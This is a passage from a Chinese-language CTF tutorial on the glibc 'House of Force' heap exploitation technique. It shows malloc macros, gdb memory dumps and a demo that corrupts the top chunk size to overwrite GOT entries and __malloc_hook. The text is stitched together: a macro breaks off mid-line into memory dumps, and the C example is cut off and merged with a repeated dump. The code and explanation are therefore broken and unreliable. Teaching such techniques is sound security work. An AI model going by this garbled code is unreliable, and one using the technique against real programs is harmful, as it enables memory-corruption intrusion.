   Check if a request is so large that it would wrap around zero when
   padded and aligned. To simplify some other code, the bound is made
   low enough so that adding MINSIZE will also not wrap around zero.
 */
#define REQUEST_OUT_OF_RANGE(req)                                              \
    ((unsigned long) (req) >= (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE))
/* pad request bytes into a usable size -- internal version */
//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1
#define request2size(req)                                                      \
    (((req) + SIZE_SZ + MALLOC_ALIGN_MASK :\	0x0000000100000000	0x0000000000000000
0x7ffff7dd1b30 :	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b40 :	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b50 :	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b60 :	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b70 :	0x0000000000000000	0x0000000000601010 :	0x0000000000000000	0x00007ffff7dd1b78
```
之后，我们分配的块就会出现在 0x601010+0x10 的位置，也就是 0x601020 可以更改 got 表中的内容了。
但是需要注意的是，在被抬高的同时，malloc@got 附近的内容也会被修改。
```c
    set_head(victim, nb | PREV_INUSE |
            (av != &main_arena ? NON_MAIN_ARENA : 0));
```
### House Of Force简单示例2
在上一个示例中，我们演示了通过 HOF 使得 top chunk 的指针减小来修改位于其上面(低地址)的got表中的内容，
但是 HOF 其实也可以使得 top chunk 指针增大来修改位于高地址空间的内容，我们通过这个示例来演示这一点
```
int main()
{
    long *ptr,*ptr2;
    ptr=malloc(0x10);
    ptr=(long *)(((long)ptr)+24);
    *ptr=-1;                 :	0x0000000100000000	0x0000000000000000
0x7ffff7dd1b30 :	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b40 :	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b50 :	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b60 :	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b70 :	0x0000000000000000	0x00007ffff7dd1b00 :	0x0000000000000000	0x00007ffff7dd1b78
```
之后，我们只要再次分配就可以控制 0x7ffff7dd1b10 处的 __malloc_hook 值了
```
rax = 0x00007ffff7dd1b10
0x400562         mov    edi, 0x10
0x400567         call   0x400410 
```
### House Of Force总结
在这一节中讲解了 House Of Force 的原理并且给出了两个利用的简单示例，通过观察这两个简单示例我们会发现其实HOF的利用要求还是相当苛刻的。
* 首先，需要存在漏洞使得用户能够控制 top chunk 的 size 域。
* 其次，**需要用户能自由控制 malloc 的分配大小**
* 第三，分配的次数不能受限制
其实这三点中第二点往往是最难办的，CTF 题目中往往会给用户分配堆块的大小限制最小和最大值使得不能通过HOF 的方法进行利用。